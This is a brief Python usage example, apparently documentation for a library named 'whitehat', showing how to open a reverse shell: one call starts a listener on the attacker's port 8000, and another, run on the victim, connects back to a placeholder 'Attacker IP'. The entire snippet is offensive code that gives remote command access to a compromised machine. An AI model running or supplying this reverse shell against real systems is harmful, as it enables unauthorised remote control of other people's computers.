import whitehat

## For attacker
whitehat.ReverseShell.attacker(PORT=8000)  # Your Port

## For victim
whitehat.ReverseShell.victim(IP="Attacker IP", PORT=8000) # (attacker_ip, attacker_port)
